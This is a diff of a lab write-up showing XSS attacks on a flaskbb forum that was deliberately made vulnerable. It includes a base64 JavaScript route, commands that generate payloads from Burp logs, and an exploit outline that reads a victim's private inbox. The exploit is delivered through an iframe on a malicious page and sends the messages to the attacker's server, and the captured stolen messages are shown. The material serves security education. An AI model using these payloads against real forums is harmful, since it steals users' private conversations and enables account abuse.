@@ -9,9 +9,9 @@ First we will setup a vulnerable application, then propose 3 different attacks :
         
 I. Setup the vulnerable application : a forum.
 ----------------------------------------------
-In an attempt to be as realistic as possible, we decided to start with a real full-fledged application. We choose flaskbb[0], a forum developped in python using flask.
+In an attempt to be as realistic as possible, I decided to start with a real full-fledged application. I choose flaskbb[0], a forum developped in python using flask.
 
-First step is to add our extra XSS "feature". We kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :
+First step is to add our extra XSS "feature". I kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :
 
     localhost:8080/xss/YWxlcnQoMSkK
 
@@ -50,7 +50,7 @@ Step 6 : Xssless is nice because we don't even have to have a deep look into wha
 
     python2 ~/secu/xssless/xssless.py -s -p params ../burp-logs/post-topic.burp > post-topic.js
 
-You can see it here[4].
+You can see the result here[4].
 
 Step 7 : Now you can edit the payload to replace the title or content of the post you want. 
 
@@ -73,14 +73,23 @@ Step 10 : profit !
 
 III. Read a user's private conversations.
 -----------------------------------------
-Of course, like any exploit, this one is dirty as heck[4]. But hey, it kind of works.
+
+So, here I hand-crafted an exploit[4]. This is classic javascript programming, so I won't explain in detail, but here is the gist :
+    
+    -request user/messages/inbox
+    -parse the response to get received message. We get title, author, and a link to the content
+    -request each of thoses new links
+    -parse the response to get the content of each message
+    -wrap it all in a serialized json, urlencode, and ship it in a GET request to our malicious website.
+
+Of course, like most exploits, this code isn't a piece of art. But hey, it works.
 
     base64 -w0 read-private.js > read-private.b64
 
     echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html
     cd malicious-website && python3 -m http.server 1337
 
-When someone (test2 in my case) visits localhost:1337/read-private.html, after a short while our malicious server receives another request :
+When someone (test2 in my case) visits localhost:1337/read-private.html, assuming he is already authenticated in the forum, our malicious server receives another request :
 
     "GET /%5B%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test1%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Private%20conversation%20is%20private%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20Or%20is%20it%20%3F%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Another%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20%E2%80%9Cprivate%E2%80%9D%20conversation%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20last%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20of%20thoses%20%22%0A%20%20%7D%0A%5D HTTP/1.1" 404 -
 
